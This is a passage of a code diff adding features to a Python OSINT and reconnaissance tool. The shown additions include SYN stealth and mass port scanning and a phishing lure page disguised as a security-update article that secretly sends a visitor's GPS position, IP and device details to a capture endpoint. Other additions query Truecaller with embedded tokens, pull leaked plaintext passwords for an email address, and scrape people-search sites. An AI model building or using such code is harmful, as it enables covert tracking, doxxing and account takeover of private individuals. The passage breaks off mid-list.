+        print(f"{Wh}\n[*] SYN stealth scan (requires scapy)...")
+        syn = SynScanner()
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090, 27017]
+        ports_open = syn.scan_range(ip, common_ports, stealth=True)
+        if ports_open:
+            print(f"{Wh}\n[+] Open ports (SYN scan):")
+            for port, service in sorted(ports_open.items()):
+                print(f"    {Gr}[+] Port {port:<5} ({service}) [SYN]")
+            data["syn_scan_ports"] = ports_open
+
+    elif scan_choice == "3":
+        print(f"{Wh}\n[*] Scanning + banner grabbing + service detection...")
+        ports_result = port_scan(ip)
+        if ports_result:
+            detect = ServiceDetector()
+            detected = detect.detect_all(ip, ports_result)
+            print(f"{Wh}\n[+] Services Detected:")
+            for port, info in sorted(detected.items()):
+                banner = info.get("banner", "")
+                service = info.get("service", "unknown")
+                print(f"    {Gr}[+] Port {port:<5} ({service})")
+                if banner:
+                    print(f"    {Wh}     Banner: {C}{banner[:100]}{RS}")
+            data["service_detection"] = detected
+            data["open_ports"] = ports_result
+        else:
+            print(f"    {Y}[!] No open ports found")
+
+    elif scan_choice == "4":
+        print(f"{Wh}\n[*] Checking for vulnerabilities...")
+        vuln = VulnerabilityChecker()
+        results = vuln.check_all(ip)
+        if results:
+            for vuln_type, info in results.items():
+                print(f"    {R}[!] {vuln_type}: {info.get('details', 'Vulnerable')}{RS}")
+            data["vulnerabilities"] = results
+        else:
+            print(f"    {Gr}[+] No common vulnerabilities detected (Heartbleed, SSLv3, NTP){Wh}")
+        # Also run service detection
+        ports_result = port_scan(ip)
+        if ports_result:
+            detect = ServiceDetector()
+            data["service_detection"] = detect.detect_all(ip, ports_result)
+            data["open_ports"] = ports_result
+
+    elif scan_choice == "5":
+        port_range = input(f"{Wh}\n[?] Port range {Gr}[e.g. 1-1000 or 80,443,8080]{Wh}: {Gr}").strip()
+        if not port_range:
+            port_range = "1-1024"
+        rate_input = input(f"{Wh}[?] Max rate (packets/sec) {Gr}[default=5000]{Wh}: {Gr}").strip()
+        try: rate = int(rate_input) if rate_input.isdigit() else 5000
+        except: rate = 5000
+        print(f"{Wh}\n[*] Mass scanning {port_range} at {rate} pps...")
+        scanner = MassPortScanner(max_rate=rate)
+        ports_result = scanner.scan(ip, port_range)
+        if ports_result:
+            print(f"{Wh}\n[+] Open Ports Found ({len(ports_result)}):")
+            for port, service in sorted(ports_result.items()):
+                print(f"    {Gr}[+] Port {port:<5} ({service})")
+            data["mass_scan_ports"] = ports_result
+        else:
+            print(f"    {Y}[!] No open ports found in range {port_range}")
     
     print(f"\n {Wh}{'='*50}")
     print(f" {R}ADDITIONAL RESOURCES")
@@ -2503,8 +2725,6 @@ def IP_Track_Enhanced():
     )
     save_report(result)
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-
-IP_Track = IP_Track_Enhanced
 
 
 def get_phone_carrier_details(phone_number: str) -> Dict:
@@ -2671,7 +2891,7 @@ def get_phone_reverse_lookup(phone: str) -> Dict:
 def display_phone_summary(phone: str, data: Dict):
     """عرض ملخص معلومات الرقم في التيرمينال"""
     print(f"\n {Wh}{'='*50}")
-    print(f" {Gr}📱 PHONE NUMBER SUMMARY")
+    print(f" {Gr} PHONE NUMBER SUMMARY")
     print(f" {Wh}{'='*50}")
     print(f"{Wh} Phone Number    : {Gr}{phone}")
     print(f"{Wh} E.164 Format    : {Gr}{data.get('E.164 Format', 'N/A')}")
@@ -2691,11 +2911,1220 @@ def display_phone_summary(phone: str, data: Dict):
     if data.get('ReverseLookup', {}).get('name'):
         print(f"{Wh} Reverse Name    : {Gr}{data['ReverseLookup']['name']}")
 
-original_phoneGW = phoneGW
+# 
+# PhoneTrackerPro v5.0 — Advanced Phone OSINT
+# 
 
-def phoneGW_Enhanced():
+class LocationConsensusVoter:
+    """نظام تصويت ذكي يجمع نتائج من 8 مصادر مختلفة لتحديد الموقع بدقة"""
+
+    def __init__(self):
+        self.all_votes = []
+
+    def add_vote(self, city: str, source: str, confidence: float, extra: str = ""):
+        if city and city.lower() not in ["unknown", "n/a", "", "india"]:
+            self.all_votes.append({
+                "city": city.strip().title(),
+                "source": source,
+                "confidence": confidence,
+                "extra": extra
+            })
+
+    def consensus_vote(self) -> Dict:
+        if not self.all_votes:
+            return {}
+        city_scores = {}
+        for v in self.all_votes:
+            c = self._normalize_city(v["city"].lower().strip())
+            score = v["confidence"]
+            if c in city_scores:
+                city_scores[c]["score"] += score
+                city_scores[c]["count"] += 1
+                city_scores[c]["sources"].append(v["source"])
+            else:
+                city_scores[c] = {
+                    "score": score, "count": 1,
+                    "sources": [v["source"]], "original": v["city"]
+                }
+        best = max(city_scores.items(), key=lambda x: x[1]["score"])
+        total_apis = len(self.all_votes)
+        agreeing = best[1]["count"]
+        combined_conf = min(0.95, best[1]["score"] / total_apis + (agreeing / total_apis) * 0.3)
+        return {
+            "city": best[1]["original"],
+            "confidence": round(combined_conf, 2),
+            "votes": f"{agreeing}/{total_apis} APIs",
+            "all_votes": self.all_votes
+        }
+
+    def _normalize_city(self, city: str) -> str:
+        city_map = {
+            "new delhi": "delhi", "delhi ncr": "delhi",
+            "bengaluru": "bangalore", "gurugram": "gurgaon",
+            "mumbai metropolitan region": "mumbai"
+        }
+        return city_map.get(city, city)
+
+
+class IPGrabber:
+    """مولد روابط صيد متقدم يجمع IP + GPS + معلومات الجهاز"""
+
+    def generate_tracking_page(self, phone_number: str, track_id: str) -> str:
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Breaking: Major Security Update — Read Now</title>
+<style>
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f8f9fa;color:#333;line-height:1.7}}
+.article{{background:white;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);padding:30px;margin:20px auto;max-width:700px}}
+.loading{{text-align:center;padding:40px;color:#888}}
+.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite}}
+</style>
+</head>
+<body>
+<div class="article">
+<h2>Major Security Update Released — What You Need to Know</h2>
+<p>A major security update has been released that affects millions of users worldwide. Experts recommend updating your devices immediately...</p>
+<div class="loading">
+<div class="spinner"></div>
+<p>Loading additional content...</p>
+</div>
+</div>
+<script>
+var data = {{
+    track_id: "{track_id}",
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenW: screen.width,
+    screenH: screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer,
+    cookiesEnabled: navigator.cookieEnabled,
+    hardwareConcurrency: navigator.hardwareConcurrency || '?',
+    deviceMemory: navigator.deviceMemory || '?'
+}};
+if (navigator.geolocation) {{
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {{
+            data.gps_lat = pos.coords.latitude;
+            data.gps_lon = pos.coords.longitude;
+            data.gps_accuracy = pos.coords.accuracy;
+            sendData(data);
+        }},
+        function(err) {{
+            data.gps_error = err.message;
+            sendData(data);
+        }},
+        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
+    );
+}} else {{
+    sendData(data);
+}}
+function sendData(d) {{
+    fetch("/capture/" + d.track_id, {{
+        method: "POST",
+        headers: {{ "Content-Type": "application/json" }},
+        body: JSON.stringify(d)
+    }});
+}}
+</script>
+</body>
+</html>"""
+
+    def capture_ip_location(self, ip: str) -> Dict:
+        try:
+            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    "city": data.get("city", "?"),
+                    "region": data.get("region", "?"),
+                    "country": data.get("country", "?"),
+                    "loc": data.get("loc", "?"),
+                    "org": data.get("org", "?"),
+                    "postal": data.get("postal", "?")
+                }
+        except:
+            pass
+        return {}
+
+
+class TruecallerProbe:
+    """باحث متقدم في Truecaller يستخدم 3 طرق مختلفة"""
+
+    def search_truecaller(self, phone_number: str, country_code: str, national_number: str) -> Dict:
+        session = requests.Session()
+        session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
+
+        result = self._search_via_api(session, phone_number, country_code)
+        if result.get("found"):
+            return result
+
+        result = self._search_via_web(session, national_number, country_code)
+        if result.get("found"):
+            return result
+
+        result = self._search_via_alt_apis(session, phone_number)
+        return result
+
+    def _search_via_api(self, session, phone_number: str, country_code: str) -> Dict:
+        api_url = f"https://search5-noneu.truecaller.com/v2/search?q={phone_number}&countryCode={country_code}&type=4"
+        install_ids = [
+            "a]i5O6mGBmaza_eLLReAXf4kMx8hQxM1POyVaTlKZO4oEYzH=",
+            "a1i0O+6maBGmBaza_eLrLZReXAf4kXMx8hQxM1xPOOyVTaTlKZZO4oEYzH="
+        ]
+        for iid in install_ids:
+            try:
+                headers = {"Authorization": f"Bearer {iid}", "Accept": "application/json"}
+                resp = session.get(api_url, headers=headers, timeout=8)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    entries = data.get("data", [])
+                    if entries:
+                        entry = entries[0]
+                        name = entry.get("name", {})
+                        return {
+                            "found": True,
+                            "name": name.get("first", "") + " " + name.get("last", ""),
+                            "email": entry.get("internetAddresses", [{}])[0].get("id", ""),
+                            "method": "API"
+                        }
+            except:
+                continue
+        return {"found": False}
+
+    def _search_via_web(self, session, national_number: str, country_code: str) -> Dict:
+        country_map = {"91": "in", "1": "us", "44": "gb"}
+        cc = country_map.get(country_code, "in")
+        try:
+            url = f"https://www.truecaller.com/search/{cc}/{national_number}"
+            resp = session.get(url, timeout=10)
+            if resp.status_code == 200 and BeautifulSoup:
+                soup = BeautifulSoup(resp.text, 'lxml')
+                script_tag = soup.find("script", {"id": "__NEXT_DATA__"})
+                if script_tag:
+                    next_data = json.loads(script_tag.string)
+                    profile = next_data.get("props", {}).get("pageProps", {}).get("data", {})
+                    name = profile.get("name", {})
+                    if isinstance(name, dict):
+                        full_name = f"{name.get('first', '')} {name.get('last', '')}".strip()
+                    else:
+                        full_name = name
+                    if full_name:
+                        return {"found": True, "name": full_name, "method": "Web"}
+        except:
+            pass
+        return {"found": False}
+
+    def _search_via_alt_apis(self, session, phone_number: str) -> Dict:
+        alt_apis = [
+            f"https://www.findandtrace.com/trace-mobile-number?number={phone_number}",
+            f"https://www.mobiletracker.net/api/lookup?number={phone_number}",
+            f"https://numlooker.com/phone/{phone_number}"
+        ]
+        for url in alt_apis:
+            try:
+                resp = session.get(url, timeout=8)
+                if resp.status_code == 200:
+                    names = re.findall(r'(?:name|Name|NAME)[":\s]+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)+)', resp.text)
+                    if names:
+                        return {"found": True, "name": names[0], "method": "AltAPI"}
+            except:
+                continue
+        return {"found": False}
+
+
+class PasswordLeakChecker:
+    """البحث عن كلمات مرور مسربة مرتبطة بالبريد الإلكتروني أو الرقم"""
+
+    def check_proxynova(self, email: str) -> Optional[List[str]]:
+        url = f"https://api.proxynova.com/comb?query={email}"
+        try:
+            resp = requests.get(url, timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                lines = data.get("lines", [])
+                passwords = set()
+                prefix = f"{email}:"
+                for line in lines:
+                    if line.startswith(prefix):
+                        parts = line.split(":", 1)
+                        if len(parts) == 2:
+                            passwords.add(parts[1].strip())
+                return list(passwords) if passwords else None
+        except:
+            pass
+        return None
+
+    def check_hudsonrock(self, email: str) -> bool:
+        url = f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={email}"
+        try:
+            resp = requests.get(url, timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return "This email address is associated with a computer that was infected" in data.get("message", "")
+        except:
+            pass
+        return False
+
+
+class ChainOfCustody:
+    """سلسلة حفظ الأدلة مع توقيع SHA-256"""
+
+    def __init__(self, case_id: str, officer: str):
+        self.case_id = case_id
+        self.officer = officer
+        self.evidence_chain = []
+        self.scan_id = uuid.uuid4().hex[:12].upper()
+
+    def log_evidence(self, action: str, detail: str = ""):
+        ts = datetime.utcnow().isoformat() + "Z"
+        entry = {
+            "timestamp_utc": ts,
+            "action": action,
+            "detail": detail,
+            "scan_id": self.scan_id,
+            "officer": self.officer,
+        }
+        entry_str = json.dumps(entry, sort_keys=True)
+        prev_hash = self.evidence_chain[-1]["hash"] if self.evidence_chain else "GENESIS"
+        entry["hash"] = self._sha256(f"{prev_hash}|{entry_str}")
+        self.evidence_chain.append(entry)
+
+    def compute_evidence_hash(self, data: Dict) -> str:
+        raw = json.dumps(data, sort_keys=True, default=str)
+        return self._sha256(raw)
+
+    def _sha256(self, data: str) -> str:
+        return hashlib.sha256(data.encode("utf-8")).hexdigest()
+
+    def generate_custody_report(self) -> str:
+        report = f"""
+
+     CHAIN OF CUSTODY REPORT            
+
+ Case ID: {self.case_id}
+ Scan ID: {self.scan_id}
+ Officer: {self.officer}
+ Total Events: {len(self.evidence_chain)}
+
+
+Events:
+"""
+        for event in self.evidence_chain:
+            report += f"\n[{event['timestamp_utc']}] {event['action']}\n    Hash: {event['hash'][:32]}...\n"
+        return report
+
+
+#  MediaWiki / Wikipedia Search Helper 
+def search_wikipedia(entity: str, lang: str = "en") -> Dict:
+    """البحث في ويكيبيديا عن كيان (اسم شركة، شخص، مكان)"""
+    result = {"found": False, "title": "", "summary": "", "url": ""}
+    try:
+        url = f"https://{lang}.wikipedia.org/w/api.php"
+        params = {
+            "action": "query", "list": "search", "srsearch": entity,
+            "format": "json", "srlimit": 3
+        }
+        resp = requests.get(url, params=params, timeout=8)
+        if resp.status_code == 200:
+            data = resp.json()
+            pages = data.get("query", {}).get("search", [])
+            if pages:
+                title = pages[0]["title"]
+                page_id = pages[0]["pageid"]
+                params2 = {
+                    "action": "query", "prop": "extracts", "exintro": True,
+                    "explaintext": True, "pageids": page_id, "format": "json"
+                }
+                resp2 = requests.get(url, params=params2, timeout=8)
+                if resp2.status_code == 200:
+                    extract_data = resp2.json()
+                    page = extract_data.get("query", {}).get("pages", {}).get(str(page_id), {})
+                    result["found"] = True
+                    result["title"] = title
+                    result["summary"] = page.get("extract", "")[:500]
+                    result["url"] = f"https://{lang}.wikipedia.org/wiki/{title.replace(' ', '_')}"
+    except:
+        pass
+    return result
+
+
+# 
+# TeleSpotter — Advanced Multi-Engine Search & Pattern Analysis
+# 
+
+class SearchEngineManager:
+    """مدير البحث المتوازي في 3 محركات (Google, Bing, DuckDuckGo)"""
+
+    def __init__(self):
+        self.engines = ['google', 'bing', 'duckduckgo']
+
+    def search_all(self, query: str, options: Dict = None) -> Dict[str, list]:
+        results = {}
+        if options is None:
+            options = {e: True for e in self.engines}
+
+        for name in self.engines:
+            if not options.get(name, True):
+                continue
+            try:
+                urls = self._search_engine(name, query)
+                results[name] = urls
+            except:
+                results[name] = []
+            time.sleep(random.uniform(0.8, 1.8))
+        return results
+
+    def _search_engine(self, engine: str, query: str) -> list:
+        urls = []
+        headers = {"User-Agent": random.choice(CONFIG["user_agents"])}
+
+        if engine == 'google':
+            url = f"https://www.google.com/search?q={url_quote(query)}&num=15"
+        elif engine == 'bing':
+            url = f"https://www.bing.com/search?q={url_quote(query)}&count=15"
+        elif engine == 'duckduckgo':
+            url = f"https://html.duckduckgo.com/html/?q={url_quote(query)}"
+        else:
+            return []
+
+        try:
+            resp = requests.get(url, headers=headers, timeout=10)
+            if resp.status_code != 200:
+                return []
+
+            if engine == 'google':
+                urls = re.findall(r'href="(https?://[^"]+)"', resp.text)
+                urls = [u for u in urls if u.startswith("http") and "google.com" not in u][:15]
+            elif engine == 'bing':
+                urls = re.findall(r'<cite[^>]*>(.*?)</cite>', resp.text, re.I)
+                urls = [u.strip() for u in urls if u.strip()][:15]
+            elif engine == 'duckduckgo':
+                if BeautifulSoup:
+                    soup = BeautifulSoup(resp.text, "html.parser")
+                    for a in soup.select("a.result__a") or soup.find_all("a", class_="result__a"):
+                        href = a.get("href", "")
+                        if href.startswith("http"):
+                            urls.append(href)
+                urls = urls[:15]
+        except:
+            pass
+        return urls
+
+    def get_search_urls(self, query: str) -> Dict[str, str]:
+        """رابط مباشر لكل محرك بحث لفتحه في المتصفح"""
+        return {
+            'google': f"https://www.google.com/search?q={url_quote(query)}",
+            'bing': f"https://www.bing.com/search?q={url_quote(query)}",
+            'duckduckgo': f"https://duckduckgo.com/?q={url_quote(query)}",
+        }
+
+
+class PatternAnalyzer:
+    """يحلل النصوص ويستخرج معلومات مفيدة (أسماء، إيميلات، حسابات) بدقة عالية"""
+
+    def __init__(self):
+        self.social_platforms = {
+            'facebook': [r'facebook\.com/([a-zA-Z0-9_.]+)', r'fb\.com/([a-zA-Z0-9_.]+)'],
+            'twitter': [r'twitter\.com/([a-zA-Z0-9_]+)', r'x\.com/([a-zA-Z0-9_]+)'],
+            'instagram': [r'instagram\.com/([a-zA-Z0-9_.]+)'],
+            'linkedin': [r'linkedin\.com/in/([a-zA-Z0-9_-]+)'],
+            'tiktok': [r'tiktok\.com/@([a-zA-Z0-9_.]+)'],
+            'youtube': [r'youtube\.com/(?:user|channel|c)/([a-zA-Z0-9_-]+)'],
+            'pinterest': [r'pinterest\.com/([a-zA-Z0-9_]+)'],
+            'reddit': [r'reddit\.com/u(?:ser)?/([a-zA-Z0-9_-]+)'],
+            'snapchat': [r'snapchat\.com/add/([a-zA-Z0-9_.]+)'],
+            'github': [r'github\.com/([a-zA-Z0-9_-]+)'],
+            'telegram': [r't\.me/([a-zA-Z0-9_]+)'],
+        }
+
+    def extract_names(self, text: str) -> List[Dict]:
+        names = []
+        seen = set()
+
+        pattern1 = r'\b([A-Z][a-z]+)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)\b'
+        for match in re.finditer(pattern1, text):
+            full_name = match.group(0).strip()
+            if self._is_valid_name(full_name) and full_name.lower() not in seen:
+                seen.add(full_name.lower())
+                names.append({
+                    'value': full_name,
+                    'source': 'pattern_match',
+                    'confidence': self._calculate_name_confidence(full_name, text)
+                })
+
+        pattern2 = r'(?:owner|name|caller|registered to|belongs to)[:\s]+([A-Z][a-z]+\s+[A-Z][a-z]+)'
+        for match in re.finditer(pattern2, text, re.IGNORECASE):
+            full_name = match.group(1).strip()
+            if self._is_valid_name(full_name) and full_name.lower() not in seen:
+                seen.add(full_name.lower())
+                names.append({
+                    'value': full_name,
+                    'source': 'labeled_match',
+                    'confidence': min(90, self._calculate_name_confidence(full_name, text) + 20)
+                })
+
+        names.sort(key=lambda x: x['confidence'], reverse=True)
+        return names[:20]
+
+    def _is_valid_name(self, name: str) -> bool:
+        if len(name) < 3 or len(name) > 50:
+            return False
+        blacklist = {'example', 'test', 'unknown', 'null', 'none', 'name', 'user'}
+        if name.lower() in blacklist:
+            return False
+        if name[0].islower() or not name[0].isalpha():
+            return False
+        return True
+
+    def _calculate_name_confidence(self, name: str, text: str) -> int:
+        confidence = 50
+        count = text.lower().count(name.lower())
+        confidence += min(count * 5, 20)
+        context_clues = ['owner', 'registered', 'belongs', 'name', 'caller']
+        for clue in context_clues:
+            idx = text.lower().find(name.lower())
+            if idx != -1:
+                context = text[max(0, idx - 50):idx + len(name) + 50].lower()
+                if clue in context:
+                    confidence += 10
+        return min(confidence, 95)
+
+    def extract_emails(self, text: str) -> List[Dict]:
+        emails = []
+        pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+        for match in re.finditer(pattern, text):
+            email = match.group(0).lower()
+            if self._is_valid_email(email):
+                emails.append({
+                    'value': email,
+                    'source': 'pattern_match',
+                    'confidence': self._calculate_email_confidence(email, text),
+                    'domain': email.split('@')[1]
+                })
+        emails.sort(key=lambda x: x['confidence'], reverse=True)
+        return emails[:10]
+
+    def _is_valid_email(self, email: str) -> bool:
+        if len(email) > 100:
+            return False
+        blacklist_domains = {'example.com', 'test.com', 'domain.com'}
+        domain = email.split('@')[1] if '@' in email else ''
+        if domain in blacklist_domains:
+            return False
+        return True
+
+    def _calculate_email_confidence(self, email: str, text: str) -> int:
+        confidence = 60
+        count = text.lower().count(email.lower())
+        confidence += min(count * 5, 20)
+        if 'contact' in text.lower() or 'email' in text.lower():
+            confidence += 10
+        return min(confidence, 95)
+
+    def extract_social_profiles(self, text: str) -> List[Dict]:
+        profiles = []
+        seen = set()
+        for platform, patterns in self.social_platforms.items():
+            for pattern in patterns:
+                for match in re.finditer(pattern, text, re.IGNORECASE):
+                    username = match.group(1)
+                    url = match.group(0)
+                    key = f"{platform}:{username.lower()}"
+                    if key not in seen:
+                        seen.add(key)
+                        profiles.append({
+                            'platform': platform,
+                            'username': username,
+                            'url': url if url.startswith('http') else f'https://{url}',
+                            'source': 'url_match',
+                            'confidence': 85
+                        })
+        profiles.sort(key=lambda x: x['confidence'], reverse=True)
+        return profiles[:20]
+
+    def analyze(self, text: str) -> Dict:
+        """تحليل كامل للنص: أسماء + إيميلات + حسابات اجتماعية"""
+        return {
+            "names": self.extract_names(text),
+            "emails": self.extract_emails(text),
+            "social_profiles": self.extract_social_profiles(text),
+        }
+
+
+class PeopleSearchManager:
+    """يدير البحث في 5 مواقع مختلفة للبحث عن الأشخاص"""
+
+    def __init__(self):
+        self.sites = {
+            'whitepages': 'https://www.whitepages.com/phone/{}',
+            'truepeoplesearch': 'https://www.truepeoplesearch.com/result?phoneno={}',
+            'fastpeoplesearch': 'https://www.fastpeoplesearch.com/{}',
+            'spokeo': 'https://www.spokeo.com/phone-search?q={}',
+            'beenverified': 'https://www.beenverified.com/phone/{}',
+        }
+
+    def search_all(self, phone: str, options: Dict = None) -> Dict[str, list]:
+        results = {}
+        clean = re.sub(r'\D', '', phone)
+        if options is None:
+            options = {s: True for s in self.sites}
+
+        for name, url_tpl in self.sites.items():
+            if not options.get(name, True):
+                continue
+            search_url = url_tpl.format(clean)
+            try:
+                resp = requests.get(
+                    search_url,
+                    headers={"User-Agent": random.choice(CONFIG["user_agents"])},
+                    timeout=8
+                )
+                page_text = resp.text if resp.status_code == 200 else ""
+                results[name] = {
+                    "url": search_url,
+                    "status": resp.status_code,
+                    "length": len(page_text),
+                    "data": self._parse_result(name, page_text) if page_text else {}
+                }
+            except:
+                results[name] = {"url": search_url, "status": 0, "length": 0, "data": {}}
+            time.sleep(random.uniform(0.5, 1.0))
+        return results
+
+    def _parse_result(self, site: str, html: str) -> Dict:
+        parsed = {}
+        if not html or not BeautifulSoup:
+            return parsed
+        soup = BeautifulSoup(html, "html.parser")
+        text = soup.get_text(separator=" ", strip=True)
+        analyzer = PatternAnalyzer()
+        parsed["names"] = [n["value"] for n in analyzer.extract_names(text)[:5]]
+        parsed["emails"] = [e["value"] for e in analyzer.extract_emails(text)[:3]]
+        parsed["social"] = [s["url"] for s in analyzer.extract_social_profiles(text)[:5]]
+        return parsed
+
+    def get_search_urls(self, phone: str) -> Dict[str, str]:
+        clean = re.sub(r'\D', '', phone)
+        return {name: tpl.format(clean) for name, tpl in self.sites.items()}
+
+
+def teleSearch_engine():
+    """TeleSpotter — بحث متقدم متعدد المحركات مع تحليل الأنماط"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} TELESPOTTER — MULTI-ENGINE OSINT SEARCH")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Parallel search · Pattern analysis · People search{Wh}")
+
+    print(f"\n{Wh} SEARCH TARGET ")
+    print(f"{Wh}  {Gr}1{Wh}) Phone number")
+    print(f"{Wh}  {Gr}2{Wh}) Email address")
+    print(f"{Wh}  {Gr}3{Wh}) Username / Name")
+    target_type = input(f"\n{Wh}[+] Type {Gr}[1/2/3]{Wh}: {Gr}").strip()
+    target = input(f"{Wh}[+] Target value: {Gr}").strip()
+    if not target:
+        return
+
+    # 1. Web search (3 engines)
+    print(f"\n{Y}[*] Phase 1 — Parallel Web Search (3 engines){Wh}")
+    sem = SearchEngineManager()
+    web_results = sem.search_all(target)
+    all_urls = []
+    for engine, urls in web_results.items():
+        if urls:
+            print(f"  {Gr}{Wh} {engine:<12}: {len(urls)} results")
+            all_urls.extend(urls[:5])
+        else:
+            print(f"  {Y}−{Wh} {engine:<12}: blocked / no results")
+
+    # 2. Pattern analysis on web text
+    print(f"\n{Y}[*] Phase 2 — Intelligent Pattern Analysis{Wh}")
+    combined_text = ""
+    for url in all_urls[:8]:
+        try:
+            resp = requests.get(url, headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=6)
+            if resp.status_code == 200:
+                combined_text += resp.text + "\n"
+        except:
+            pass
+
+    analyzer = PatternAnalyzer()
+    analysis = analyzer.analyze(combined_text) if combined_text else {"names": [], "emails": [], "social_profiles": []}
+
+    if analysis["names"]:
+        print(f"  {Gr}{Wh} Names found: {Gr}{len(analysis['names'])}{Wh}")
+        for n in analysis["names"][:5]:
+            print(f"      {C}{n['value']}{Wh} ({n['confidence']}%)")
+    if analysis["emails"]:
+        print(f"  {Gr}{Wh} Emails found: {Gr}{len(analysis['emails'])}{Wh}")
+        for e in analysis["emails"][:3]:
+            print(f"      {C}{e['value']}{Wh}")
+    if analysis["social_profiles"]:
+        print(f"  {Gr}{Wh} Social profiles: {Gr}{len(analysis['social_profiles'])}{Wh}")
+        for s in analysis["social_profiles"][:5]:
+            print(f"      {C}{s['url']}{Wh}")
+
+    if not combined_text:
+        print(f"  {Y}No pages fetched for analysis{Wh}")
+
+    # 3. People search (only for phone numbers)
+    if target_type == "1":
+        print(f"\n{Y}[*] Phase 3 — People Search (5 databases){Wh}")
+        psm = PeopleSearchManager()
+        people_results = psm.search_all(target)
+        for site, info in people_results.items():
+            names = info.get("data", {}).get("names", [])
+            if names:
+                print(f"  {Gr}{Wh} {site:<18}: {', '.join(names[:3])}{Wh}")
+            else:
+                print(f"  {Y}−{Wh} {site:<18}: no data (status {info.get('status', '?')})")
+
+    # 4. Wikipedia lookup for names found
+    if analysis["names"]:
+        print(f"\n{Y}[*] Phase 4 — Wikipedia Lookup{Wh}")
+        for n in analysis["names"][:2]:
+            wiki = search_wikipedia(n["value"])
+            if wiki["found"]:
+                print(f"  {Gr}{Wh} {wiki['title']}: {C}{wiki['url']}{Wh}")
+                print(f"    {Y}{wiki['summary'][:150]}...{Wh}")
+
+    # 5. Report
+    final_data = {
+        "target": target,
+        "web_search": {e: len(u) for e, u in web_results.items()},
+        "analysis": analysis,
+    }
+    result = ScanResult(
+        timestamp=datetime.now().isoformat(),
+        scan_type="telespotter",
+        target=target,
+        data=final_data
+    )
+    save_report(result)
+    print(f"\n{Gr}[] Report saved{Wh}")
+
+    # Show direct search URLs
+    print(f"\n{Wh} DIRECT SEARCH LINKS ")
+    for engine, url in sem.get_search_urls(target).items():
+        print(f"{Wh} {engine:<12}: {C}{url}{RS}")
+    if target_type == "1":
+        psm = PeopleSearchManager()
+        for site, url in psm.get_search_urls(target).items():
+            print(f"{Wh} {site:<18}: {C}{url}{RS}")
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+# 
+# Wiwok — Smart Cache, Confidence & SMOS Engine
+# 
+
+_CACHE_SENTINEL = object()
+_ANSI_STRIP = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')
+
+class Cache:
+    """In-memory request cache with TTL, thread-safe, auto-cleanup."""
+    def __init__(self, ttl=300):
+        self.store = {}
+        self.timestamps = {}
+        self._lock = threading.Lock()
+        self.ttl = ttl
+
+    def _expired(self, k):
+        ts = self.timestamps.get(k)
+        return ts is None or (time.time() - ts) > self.ttl
+
+    def get(self, k):
+        with self._lock:
+            if k in self.store and not self._expired(k):
+                return self.store[k]
+            self.store.pop(k, None)
+            self.timestamps.pop(k, None)
+            return _CACHE_SENTINEL
+
+    def put(self, k, v):
+        with self._lock:
+            self.store[k] = v
+            self.timestamps[k] = time.time()
+            if len(self.store) > 2000:
+                now = time.time()
+                expired = [ek for ek, ts in self.timestamps.items()
+                           if now - ts > self.ttl]
+                for ek in expired:
+                    self.store.pop(ek, None)
+                    self.timestamps.pop(ek, None)
+
+_CACHE = Cache()
+
+#  Confidence Scoring 
+CONF_HIGH   = "HIGH"
+CONF_MEDIUM = "MEDIUM"
+CONF_LOW    = "LOW"
+CONF_NOISE  = "NOISE"
+
+_CONF_RANK = {CONF_HIGH: 3, CONF_MEDIUM: 2, CONF_LOW: 1, CONF_NOISE: 0}
+
+_CONF_NOISE_MODULES = {"google_dorks", "name_dorks", "linkedin_dorks",
+                       "wayback_check", "pastebin_search", "duckduckgo_search",
+                       "gdelt_news", "unavatar", "username_variants"}
+
+_CONF_API_MODULES = {
+    "github_profile", "github_emails", "github_by_email",
+    "gitlab_profile", "codeberg_profile", "keybase",
+    "reddit_profile", "bluesky_profile", "hackernews_profile",
+    "npm_profile", "pypi_profile", "cratesio_profile",
+    "rubygems_profile", "dockerhub_profile", "devto_profile",
+    "chesscom_profile", "lichess_profile", "myanimelist_profile",
+    "anilist_profile", "gravatar", "emailrep", "xposedornot", "hibp",
+}
+
+_CONF_SCRAPE_MODULES = {
+    "instagram_check", "facebook_check", "tiktok_check",
+    "snapchat_check", "youtube_check", "twitch_check",
+    "pinterest_check", "steam_check", "mastodon_search",
+}
+
+def score_confidence(module_name, line, found_via_api=False):
+    """Assign confidence score to a finding line."""
+    if module_name in _CONF_NOISE_MODULES:
+        return CONF_NOISE
+    if module_name in _CONF_API_MODULES:
+        return CONF_HIGH
+    if module_name in _CONF_SCRAPE_MODULES:
+        return CONF_MEDIUM
+    if module_name == "telegram_check" and "[+]" in line:
+        return CONF_HIGH
+    return CONF_MEDIUM
+
+#  Noise Filtering 
+_NOISE_PATTERNS = [
